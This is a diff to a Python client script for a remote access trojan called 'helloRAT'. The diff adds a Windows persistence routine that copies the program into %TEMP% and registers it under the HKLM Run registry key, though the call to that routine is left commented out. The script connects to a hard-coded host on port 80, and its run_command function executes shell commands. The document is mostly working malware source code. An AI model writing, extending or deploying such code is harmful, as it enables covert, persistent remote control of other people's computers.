@@ -1,14 +1,53 @@
 #!/usr/bin/python           # This is client.py file
 import socket
-import sys
-from _thread import *
+import sys, base64, os, socket, subprocess
+from winreg import *
 import sys, os, subprocess
 import time
 from time import ctime
 
-HOST = '10.3.39.117'  # Symbolic name meaning all available interfaces
+HOST = '10.3.36.160'  # Symbolic name meaning all available interfaces
 PORT = 80  # Arbitrary non-privileged port
 
+
+def autorun(tempdir, file_name, run):
+    # Copy executable to %TEMP%:
+    os.system('copy %s %s' % (file_name, tempdir))
+
+    # Queries Windows registry for key values
+    # Appends autorun key to runkey array
+    key = OpenKey(HKEY_LOCAL_MACHINE, run)
+    run_key = []
+    try:
+        i = 0
+        while True:
+            sub_key = EnumValue(key, i)
+            run_key.append(sub_key[0])
+            i += 1
+    except WindowsError:
+        pass
+
+    # Set autorun key:
+    if 'Adobe ReaderX' not in run_key:
+        try:
+            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
+            SetValueEx(key, 'helloRAT', 0, REG_SZ, r"%TEMP%\helloRAT.exe")
+            key.Close()
+        except WindowsError:
+            pass
+
+def get_autoruns(run):
+    key = OpenKey(HKEY_LOCAL_MACHINE, run)
+    run_key = []
+    try:
+        i = 0
+        while True:
+            sub_key = EnumValue(key, i)
+            run_key.append(sub_key[0])
+            i += 1
+    except WindowsError:
+        pass
+    return run_key
 
 def run_command(cmd):
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
@@ -27,6 +66,15 @@ def recvall(sock):
     sock.close()
 
 
+tempdir = '%TEMP%'
+fileName = sys.argv[0]
+run = "Software\Microsoft\Windows\CurrentVersion\Run"
+
+'''
+#this command open for need autorun
+if "helloRAT" not in get_autoruns(run):
+    autorun(tempdir, fileName, run)
+'''
 # Create a TCP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
